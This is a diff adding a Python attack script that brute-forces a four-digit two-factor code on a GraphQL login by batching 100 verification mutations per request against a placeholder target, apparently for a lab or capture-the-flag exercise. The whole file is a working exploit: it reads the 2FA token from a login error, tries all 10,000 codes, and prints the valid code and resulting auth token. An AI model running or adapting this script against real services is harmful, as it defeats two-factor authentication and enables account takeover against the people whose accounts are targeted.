@@ -1,0 +1,39 @@
+import requests
+import json
+
+HOST = "http://<TARGET_IP>:<PORT>"
+EMAIL = "admin@example.com"
+PASSWORD = "password123"
+
+# Login to get fresh 2FA token
+login = requests.post(f"{HOST}/graphql",
+    headers={"Content-Type": "application/json"},
+    json={"query": f'mutation {{ login(email: "{EMAIL}", password: "{PASSWORD}") {{ token user {{ id email }} }} }}'})
+
+error = login.json()["errors"][0]["message"]
+token = error.split("2FA_REQUIRED:")[1]
+print(f"[*] 2FA token: {token}")
+
+# Brute force OTP in batches of 100
+for batch_start in range(0, 10000, 100):
+    batch = []
+    for otp in range(batch_start, batch_start + 100):
+        otp_str = str(otp).zfill(4)
+        batch.append({
+            "query": f'mutation {{ verifyTwoFactor(token: "{token}", otp: "{otp_str}") {{ token user {{ id email }} }} }}'
+        })
+
+    r = requests.post(f"{HOST}/graphql",
+        headers={"Content-Type": "application/json"},
+        data=json.dumps(batch))
+
+    results = r.json()
+    for i, result in enumerate(results):
+        data = result.get("data", {}).get("verifyTwoFactor")
+        if data:
+            otp_str = str(batch_start + i).zfill(4)
+            print(f"[+] Valid OTP: {otp_str}")
+            print(f"[+] Auth token: {data['token']}")
+            exit()
+
+    print(f"[*] Tried {batch_start + 100}/10000...")
